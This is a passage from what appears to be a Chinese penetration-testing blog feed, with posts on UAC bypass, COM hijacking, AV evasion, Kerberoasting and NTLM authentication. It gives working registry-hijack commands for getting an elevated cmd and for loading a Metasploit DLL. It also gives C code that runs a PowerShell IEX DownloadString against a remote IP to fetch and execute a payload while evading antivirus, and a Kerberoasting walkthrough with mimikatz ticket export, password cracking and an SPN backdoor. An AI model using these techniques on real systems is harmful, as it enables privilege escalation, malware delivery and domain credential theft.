<br>c:<span class="hljs-regexp">/windows/</span>system32/WindowsUpdateElevatedInstaller.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/WSReset.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/wusa.exe<br></code></pre></td></tr></table></figure><p>然后再去寻找不弹uac框的程序，这里我就从上往下开始尝试，找到的是<code>ComputerDefaults.exe  </code>这个exe</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094919649.png" alt="image-20220318094919649"></p><p>运行之后直接就会出现默认应用这个界面</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094948895.png" alt="image-20220318094948895"></p><h4 id="uac程序特性探究"><a href="#uac程序特性探究" class="headerlink" title="uac程序特性探究"></a>uac程序特性探究</h4><p>通常以shell/open/command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>这里使用process monitor监听<code>ComputerDefaults.exe</code></p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095032315.png" alt="image-20220318095032315"></p><p>发现他会去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>里面的值</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095044914.png" alt="image-20220318095044914"></p><p>那么我们创建一个<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>路径，再对<code>ComputerDefaults.exe</code>进行监听尝试</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095139907.png" alt="image-20220318095139907"></p><p>然后发现他还会去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command/DelegateExecute</code>，而且Result显示的是NAME NOT FOUND，那么可以认为首先去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>路径下的注册表，再去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command/DelegateExecute</code>是否存在</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095151212.png" alt="image-20220318095151212"></p><p>那么这里我创建一个DelegateExecute的键值对，然后把默认键值对指向我的一个程序进行尝试</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095202623.png" alt="image-20220318095202623"></p><p>当我运行<code>c:/windows/system32/ComputerDefaults.exe</code>的时候，发现不再弹出的是默认进程的界面，而是打开了我自己的程序</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095226667.png" alt="image-20220318095226667"></p><p>那么这里就可以大胆的猜测一下，首先运行<code>ComputerDefaults.exe</code>这个程序之前，会查询<code>HKCU:/Software/Classes/ms-settings/shell/open/command</code>这个目录是否存在，若存在继续寻找同目录下是否有<code>DelegateExecute</code>这个键值对，若两者都存在则执行<code>HKCU:/Software/Classes/ms-settings/shell/open/command</code>指向的exe路径</p><p>为了验证猜想，这里我将exe路径改为cmd，若猜测成立则可以获得管理员权限的cmd</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095250819.png" alt="image-20220318095250819"></p><p><code>whoami /priv</code>查看一下果然成功</p><p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095301046.png" alt="image-20220318095301046"></p><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&amp;mid=2247488251&amp;idx=1&amp;sn=24eb93cd3251e323520027e147bca81e&amp;chksm=ce64a847f91321510f316a4d371443a845965652ed13272b7a2296a0ffb4c1313f7ac79d0bc3&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&amp;mid=2247488251&amp;idx=1&amp;sn=24eb93cd3251e323520027e147bca81e&amp;chksm=ce64a847f91321510f316a4d371443a845965652ed13272b7a2296a0ffb4c1313f7ac79d0bc3&amp;scene=132#wechat_redirect</a></p><h3 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h3><p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">HKCU<span class="hljs-regexp">/Software/</span>Classes/CLSID<br>HKCR/CLSID<br>HKLM<span class="hljs-regexp">/SOFTWARE/</span>Microsoft<span class="hljs-regexp">/Windows/</span>CurrentVersion<span class="hljs-regexp">/ShellCompatibility/</span>Objects/<br></code></pre></td></tr></table></figure><p>以eventvwr为例</p><p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p><p>而eventvwr的这个组件一般在HKCR/CLSID找到，所以可以搜索路径劫持。</p><p>利用以下方法可以劫持（搜索路径劫持）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;d:/msf_x64.dll&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;LoadWithoutCOM&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;ThreadingModel&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;Apartment&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/ShellFolder /v <span class="hljs-string">&quot;HideOnDesktop&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/ShellFolder /v <span class="hljs-string">&quot;Attributes&quot;</span> /t REG_DWORD /d <span class="hljs-number">0</span>xf<span class="hljs-number">090013</span>d /f<br></code></pre></td></tr></table></figure><p>一个开源项目，记录了许多Bypassuac的方法。</p><p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p><h3 id="通过模拟可信目录绕过-UAC"><a href="#通过模拟可信目录绕过-UAC" class="headerlink" title="通过模拟可信目录绕过 UAC"></a>通过模拟可信目录绕过 UAC</h3><p>参考：<a href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</a></p><p><a href="https://www.anquanke.com/post/id/209033#h2-4">https://www.anquanke.com/post/id/209033#h2-4</a></p>]]></content>
    
    
    <categories>
      
      <category>绕过</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c+powershell免杀</title>
    <link href="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/"/>
    <url>/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<p> powershell 的上线方式 现在很多都拦了  可以尝试将powershell语句 写入代码中  用可执行文件来调用powershell 执行命令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;powershell.exe set-alias -name hhh -value IEX;hhh(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.xxx.xx:80/a&#x27;) &quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译</p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313005618323.png" alt="image-20220313005618323"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010644322.png" alt="image-20220313010644322"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010813690.png" alt="image-20220313010813690"></p><p><img src="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/image-20220313010920748.png" alt="image-20220313010920748"></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberoasting</title>
    <link href="/2022/03/04/Kerberoasting/"/>
    <url>/2022/03/04/Kerberoasting/</url>
    
    <content type="html"><![CDATA[<h2 id="第一种利用"><a href="#第一种利用" class="headerlink" title="第一种利用"></a>第一种利用</h2><h2 id="一、-Kerberos认证过程"><a href="#一、-Kerberos认证过程" class="headerlink" title="一、 Kerberos认证过程"></a>一、 Kerberos认证过程</h2><ul><li> Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li><li> 通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li><li> 用户拿着<strong>TGS</strong>通过目标服务实例验证后可以去访问对应的服务资源，</li><li> <strong>Kerberoasting</strong>攻击利用TGS票据加密算法已知这一条件，尝试穷举口令，对<strong>TGS</strong>进行对比，若<strong>TGS</strong>相同，则口令正确。得到对应服务实例的明文密码。</li></ul><p>还有几点是需要大家明白的:</p><p>1.当域控查询某一个服务的SPN时</p><p>如果该SPN注册在机器账户computers下，将会查询所有机器账户的servicePrincipalName属性，找到所对应的账户。</p><p>如果是注册在域用户账户users下，将会查询所有域用户账户的servicePrincipalName属性，找到其所对应的账户。</p><p>找到对应的账户之后，使用它的NTLM hash生成TGS。</p><p>2.域内的所有主机都是可以查询SPN的</p><p>3.域内的任何用户都是可以向域内的任何服务请求TGS</p><p>对于破解的明文口令，只有域用户账户(Users)的口令存在价值，不必考虑机器账户的口令(无法用于远程连接)</p><p>所以，域内的任何一台主机，都可以通过查询SPN，向域内的所有服务请求TGS，然后进行暴力破解，但是对于破解出的明文，只有域用户的是可以利用的，机器账户的不能用于远程连接，所以我们的关注点主要就在域用户下注册的SPN。</p><p>利用思路如下：</p><ol><li>查询SPN，找到有价值的SPN，需要满足如下条件<ul><li>SPN注册在域用户账户下(Users)</li><li>域用户账户的权限很高</li></ul></li><li>请求TGS</li><li>导出TGS</li><li>利用字典破解TGS拿到明文密码</li></ol><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h3><p>​        域：YUNYING.LAB </p><p>​        域控：Windows Server 2008 R2 x64(DC) </p><p>​        域内主机：Windows 7 x64(s1):用户 ts1 </p><p>​        域内主机：Windows Server 2008 R2 x64(s2):用户 tsvc </p><h3 id="所需工具："><a href="#所需工具：" class="headerlink" title="所需工具："></a>所需工具：</h3><p>​        Kerberoast 工具包 </p><p>​        Mimikatz </p><h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3><h4 id="一、在域内主机-s1-中通过-Kerberoast-中的-GetUserSPNs-ps1-或者-GetUserSPNs-vbs-进行-SPN-扫描。"><a href="#一、在域内主机-s1-中通过-Kerberoast-中的-GetUserSPNs-ps1-或者-GetUserSPNs-vbs-进行-SPN-扫描。" class="headerlink" title="一、在域内主机 s1 中通过 Kerberoast 中的 GetUserSPNs.ps1 或者 GetUserSPNs.vbs 进行 SPN 扫描。"></a>一、在域内主机 s1 中通过 Kerberoast 中的 GetUserSPNs.ps1 或者 GetUserSPNs.vbs 进行 SPN 扫描。</h4><p><img src="/2022/03/04/Kerberoasting/image-20220213165249776.png" alt="image-20220213165249776"></p><h4 id="二、根据扫描出的结果使用微软提供的类-KerberosRequestorSecurityToken-发起-kerberos-请-求，申请-ST-票据。"><a href="#二、根据扫描出的结果使用微软提供的类-KerberosRequestorSecurityToken-发起-kerberos-请-求，申请-ST-票据。" class="headerlink" title="二、根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请 求，申请 ST 票据。"></a>二、根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请 求，申请 ST 票据。</h4><p><a href="https://docs.microsoft.com/enus/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?redirectedfro">https://docs.microsoft.com/enus/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?redirectedfro</a> m=MSDN&amp;view=netframework-4.7.2 </p><p>PS C:/&gt; Add-Type -AssemblyName System.IdentityModel </p><p>PS C:/&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/s2:1433” </p><p><img src="/2022/03/04/Kerberoasting/image-20220213165315175.png" alt="image-20220213165315175"></p><p>可以看到这个过程通过 AS-REQ、AS-REP、TGS-REQ、TGS-REP 这四个认证流程，获取到 RC4 方式加密的票据。</p><p><img src="/2022/03/04/Kerberoasting/image-20220213165332157.png" alt="image-20220213165332157"></p><h4 id="三、Kerberos-协议中请求的票据会保存在内存中，可以通过-klist-命令查看当前会话存储的-kerberos-票据。"><a href="#三、Kerberos-协议中请求的票据会保存在内存中，可以通过-klist-命令查看当前会话存储的-kerberos-票据。" class="headerlink" title="三、Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。"></a>三、Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</h4><p><img src="/2022/03/04/Kerberoasting/image-20220213165400617.png" alt="image-20220213165400617"></p><p>使用 mimikatz 导出。</p><p><img src="/2022/03/04/Kerberoasting/image-20220213165411238.png" alt="image-20220213165411238"></p><p><img src="/2022/03/04/Kerberoasting/image-20220213165418178.png" alt="image-20220213165418178"></p><p>使用 kerberoast 工具集中的 tgsrepcrack.py 工具进行离线爆破，成功得到 tsvc 账号的密码 admin1234!</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/nidem/</span>kerberoast<span class="hljs-regexp">/blob/m</span>aster/tgsrepcrack.py 项目地址<br></code></pre></td></tr></table></figure><h2 id="第二种利用-Kerberoasting后门利用"><a href="#第二种利用-Kerberoasting后门利用" class="headerlink" title="第二种利用 Kerberoasting后门利用"></a>第二种利用 Kerberoasting后门利用</h2><p>当我们取得SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p><p>例如为域用户<strong>administrator</strong>添加SPN NC/dc.de1ay.com</p><p><img src="/2022/03/04/Kerberoasting/image-20220213170009198.png" alt="image-20220213170009198"></p><p>此时为域内用户administrator添加了一个SPN，在域内任何一台主机上都可以获得本SPN，并能使用Kerberoast获得TGS</p><p>在后续需要使用时请求服务，获取TGS使用Hashcat破解即可</p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
      <category>Kerberos</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTLM基础学习</title>
    <link href="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Windows-认证"><a href="#Windows-认证" class="headerlink" title="Windows 认证"></a>Windows 认证</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Windows 系统内部不保存⽤户的明⽂密码，只保存密码的 Hash 值 </li><li>本机⽤户 的密码 Hash 是存放 SAM（ C:/Windows/System32/config/SAM ）⽂件中 </li><li>域内⽤户 的密码 Hash 是存在域控的 NTDS.DIT ⽂件中</li></ul><p>Windows 系统导出密码的格式如下： </p><p>⽤户名:RID:LM-Hash:NTLM-Hash</p><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219220317422.png" alt="image-20220219220317422"></p><p>当 Windows ⽤户密码 ≤ 14 个字符，SAM ⽂件中是 LM-Hash 值 + NTLM-Hash 值 </p><p>当 Windows ⽤户密码 ＞14 个字符，SAM ⽂件中是 NTLM-Hash 值</p><h2 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash &amp; NTLM Hash"></a>LM Hash &amp; NTLM Hash</h2><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>全称是LAN Manager Hash, windows最早用的加密算法，由IBM设计。</p><p>Windows XP、Windows 2000、Windows 2003 系统默认使⽤ LM Hash 加密 Windows 2008、Windows 7、Windows Vista、Windows 8、Windows 10、Windows 2016 禁⽤了 LM Hash， 默认使⽤ NTLM Hash</p><h3 id="LM-Hash-⽣成步骤"><a href="#LM-Hash-⽣成步骤" class="headerlink" title="LM-Hash ⽣成步骤:"></a>LM-Hash ⽣成步骤:</h3><ul><li>1.⽤户⼝令全部转为⼤写 </li><li>2.⽤户⼝令转为 16 进制之后不⾜ 14 个字符（28 位）⻓度，⽤ 0 补⾜ </li><li>3.把密码的 16 进制字符串分成两个 7 byte 部分 </li><li>4.每部分转换成⽐特流，并且⻓度为 56 bit，⻓度不⾜使⽤ 0 在左边补⻬⻓度 </li><li>5.再分 7 bit 为⼀组末尾加 0，转换为 16 进制，组成新的编码 </li><li>6.分别⽤ key 为“KGS!@#$％”（4B47532140232425）进⾏ DES 加密 </li><li>7.最后将⼆组 DES 加密后的编码拼接，获得 LM-Hash 值</li></ul><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219220634249.png" alt="image-20220219220634249"></p><h3 id="LM加密算法存在一些固有的漏洞"><a href="#LM加密算法存在一些固有的漏洞" class="headerlink" title="LM加密算法存在一些固有的漏洞"></a>LM加密算法存在一些固有的漏洞</h3><ol><li>首先，密码长度最大只能为14个字符</li><li>密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</li><li>查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到lm hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</li><li>一个14个字符的密码分成7 + 7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度成倍增加，因为攻击者需要将7个字符（而不是14个字符）强制暴力破解。这使得14个字符的密码的有效强度等于，或者是7个字符的密码的两倍，该密码的复杂度明显低于<a href="https://p0.ssl.qhimg.com/t01f87ddf44d540f820.png"><img src="https://p0.ssl.qhimg.com/t01f87ddf44d540f820.png" alt="img"></a>14个字符的密码的理论强度。</li><li>Des密码强度不高</li></ol><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><ul><li>为了解决 LM 加密和身份验证⽅案中固有的安全弱点，Microsoft 于 1993 年在 Windows NT 3.1 中引⼊了 NTLM 协议 </li><li>通常是指 Windows 系统下 Security Account Manager 中保存的⽤户密码 Hash </li><li>可以直接⽤于 PTH（Pass The Hash），并且通常存在于 LSASS 进程中，便于 SSP（NTLM 安全⽀持提供程 序）使⽤</li></ul><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219221338432.png" alt="image-20220219221338432"></p><p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。(因此后面我们介绍身份认证的时候只介绍Net-ntlm，不再介绍net-lm)如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是AAD3B435B51404EEAAD3B435B51404EE。</p><h3 id="NTLM-Hash-⽣成步骤"><a href="#NTLM-Hash-⽣成步骤" class="headerlink" title="NTLM-Hash ⽣成步骤"></a>NTLM-Hash ⽣成步骤</h3><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219221529586.png" alt="image-20220219221529586"></p><p>1.先将用户密码转换为十六进制格式。</p><p>2.将十六进制格式的密码进行Unicode编码。</p><p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算</p><h3 id="NTLM-本地认证"><a href="#NTLM-本地认证" class="headerlink" title="NTLM 本地认证"></a>NTLM 本地认证</h3><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219221635959.png" alt="image-20220219221635959"></p><ol><li><p>Windows 调⽤ winlogon.exe 进程（也就是我们平常⻅到的登录框）接收⽤户的密码，之后将密码传送给 lsass.exe 进程 </p></li><li><p>lsass.exe 进程会先在内存中存储⼀份明⽂密码，然后将明⽂密码加密为 NTLM-Hash 后，与Windows 本地的 SAM 数据库中该⽤户的 NTLM-Hash 对⽐，如果⼀致则通过认证</p></li></ol><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><ul><li>Net-NTLM Hash 指⽹络环境下 NTLM 认证中的 Hash </li><li>Net-NTLM Hash 是 Challenge/Response 认证机制中客户端发往服务端的 Response </li><li>Net-NTLM Hash 不能直接获取，可通过 Responder ⼯具进⾏拦截获取，此 Hash 不能进⾏PTH（Pass The Hash），但可进⾏中继转发</li></ul><h4 id="NTLM-认证机制"><a href="#NTLM-认证机制" class="headerlink" title="NTLM 认证机制"></a>NTLM 认证机制</h4><p>NTLM 是⼀种⽹络认证协议，采⽤ Challenge/Response 机制</p><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219222855462.png" alt="image-20220219222855462"></p><ul><li>1.⾸先客户端向服务端发送⽤户名以及本机的⼀些信息 </li><li>2.服务端接收到客户端的⽤户名后，先⽣成⼀个随机的 16 位的 Challenge（挑战随机数），本地储存后将 Challenge 返回给客户端 </li><li>3.客户端接收到服务端发来的 Challenge 后，使⽤⽤户输⼊密码的 NTLM Hash 对 Challenge 进⾏加密⽣成 Response（也叫 Net-NTLM Hash），将 Response 发送给服务端 </li><li>PS：经过NTLMHash加密的Challenge称为NetNTLM Hash。</li><li>4.服务端接收到客户端发来的 Response，使⽤数据库中对应⽤户的 NTLM Hash 对之前存储的 Challenge 进⾏ 加密，得到的结果与接收的 Response 进⾏对⽐，如果⼀致则通过认证</li></ul><h4 id="NTLM-认证缺陷"><a href="#NTLM-认证缺陷" class="headerlink" title="NTLM 认证缺陷"></a>NTLM 认证缺陷</h4><ul><li>在认证过程中⽤户的明⽂密码并没有在客户端和服务端之间传输，取⽽代之的是 Net-NTLM Hash </li><li>如果攻击者得到了⽤户的 NTLM Hash，那么便可以冒充该⽤户通过身份验证，即 Hash 传递攻击（Pass The Hash，PTH）</li></ul><h3 id="NTLM-认证协议"><a href="#NTLM-认证协议" class="headerlink" title="NTLM 认证协议"></a>NTLM 认证协议</h3><ul><li>在 NTLM 认证中，分为 Net-NTLM v1、Net-NTLM v2 两种协议 </li><li>不同协议使⽤不同格式的 Challenge 和加密算法 </li><li>所以存在不同协议的 Net-NTLM Hash，即 Net-NTLM v1 Hash、Net-NTLM v2 Hash 两种协议 </li><li>Net-NTLM v1：DES 加密、8 位 Challenge </li><li>Net-NTLM v2：HMAC-MD5 加密、16 位 Challenge</li></ul><h3 id="NTLM-域认证"><a href="#NTLM-域认证" class="headerlink" title="NTLM 域认证"></a>NTLM 域认证</h3><p>域认证默认⾸选是 Kerberos 认证，但是也可以使⽤ NTLM 来进⾏认证 </p><p>NTLM 在域环境中区别主要是最终在域控（DC）中完成验证</p><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219223830895.png" alt="image-20220219223830895"></p><ul><li>1.客户端向服务端发送⽤户名等信息 </li><li>2.服务端返回随机 16 位 Challenge </li><li>3.客户端⽤本地 NTLM Hash 加密⽣成 Response，并将 Response 发送给服务端 </li><li>4.服务端向域控（DC）发送⽤户名、之前返回给客户端的 Challenge、客户端发来的 Response </li><li>5.域控（DC）⽤本地数据库（NTDT.DIT）⾥的 NTLM Hash 加密 Challenge，将结果与 Response 对⽐，然后 将验证结果返回给服务端 </li><li>6.服务端再将结果消息返回给客户端</li></ul><h3 id="Net-NTLM-Hash-获取"><a href="#Net-NTLM-Hash-获取" class="headerlink" title="Net-NTLM Hash 获取"></a>Net-NTLM Hash 获取</h3><p>利⽤ Responder ⼯具，配合⼀些中间⼈或者其他技巧，它可以通过设置多个模拟的恶意进程（如 SQL 服务器、 FTP、HTTP 和 SMB 服务器等）来直接模拟凭据或模拟 Challenge/Response 验证的过程，并捕获客户端发送的 Net-NTLM Hash</p><p>项⽬地址：<a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p><h2 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp; SSPI"></a>SSP &amp; SSPI</h2><p><img src="/2022/03/04/NTLM%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20220219225838549.png" alt="image-20220219225838549"></p><ul><li>SSPI(Security Support Provider Interface)</li></ul><p>这是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p><ul><li>SSP(Security Support Provider)</li></ul><p> SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><ol><li><p>1.</p><p>NTLM SSP</p></li><li><p>2.</p><p>Kerberos</p></li><li><p>3.</p><p>Cred SSP</p></li><li><p>4.</p><p>Digest SSP</p></li><li><p>5.</p><p>Negotiate SSP</p></li><li><p>6.</p><p>Schannel SSP</p></li><li><p>7.</p><p>Negotiate Extensions SSP</p></li><li><p>8.</p><p>PKU2U SSP</p></li></ol><p>在系统层面，SSP就是一个dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p><p>这个地方可以用于留作后门。</p><p>参考：<a href="https://www.anquanke.com/post/id/193149#h2-9">https://www.anquanke.com/post/id/193149#h2-9</a></p>]]></content>
    
    
    <categories>
      
      <category>NTLM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NTLM</tag>
      
    </tags>
    
  </entry>
  
  
  
